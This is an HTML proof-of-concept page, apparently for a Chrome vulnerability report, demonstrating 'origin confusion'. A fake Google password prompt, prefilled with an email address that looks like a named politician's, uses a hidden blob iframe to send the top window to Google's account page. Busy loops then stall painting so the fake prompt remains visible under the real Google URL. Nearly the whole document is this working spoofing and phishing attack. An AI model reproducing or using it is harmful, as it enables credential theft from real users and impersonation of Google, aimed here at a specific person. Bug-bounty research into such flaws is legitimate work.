<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Chrome VRP: Origin Confusion</title>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 12px; max-width: 350px; margin: 0 auto; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 16px; width: 100%; cursor: pointer; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    </style>
</head>
<body>

    <div id="ui">
        <div class="box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
            <h3>Security Alert</h3>
            <p>Please confirm your password to continue.</p>
            <input type="email" value="joshhawleyofficial@gmail.com" readonly style="background:#f1f3f4;">
            <input type="password" placeholder="Password">
            <button class="btn" onclick="triggerDoubleBlob()">Sign In</button>
        </div>
    </div>

    <script>
        function triggerDoubleBlob() {
            const target = "https://myaccount.google.com/?pli=1";
            
            // 1. Create a malicious blob that will trigger the 'real' navigation
            // This 'middle-man' script is what creates the origin confusion
            const blobCode = `
                <script>
                    window.parent.location.href = "${target}";
                    let start = Date.now();
                    while (Date.now() - start < 4000) { /* Stall the renderer */ }
                <\/script>
            `;
            const blob = new Blob([blobCode], {type: 'text/html'});
            const blobUrl = URL.createObjectURL(blob);

            // 2. Create an iframe to host the blob
            const ifr = document.createElement('iframe');
            ifr.style.display = 'none';
            ifr.src = blobUrl;
            document.body.appendChild(ifr);

            // 3. The Race: While the iframe is forcing the 'top' window to Google,
            // we keep the main page busy so it doesn't clear the screen.
            let frames = 0;
            function hold() {
                frames++;
                // Busy work to prevent 'Paint'
                const s = Date.now();
                while(Date.now() - s < 100) {} 
                
                if (frames < 40) requestAnimationFrame(hold);
            }
            requestAnimationFrame(hold);
        }
    </script>
</body>
</html>
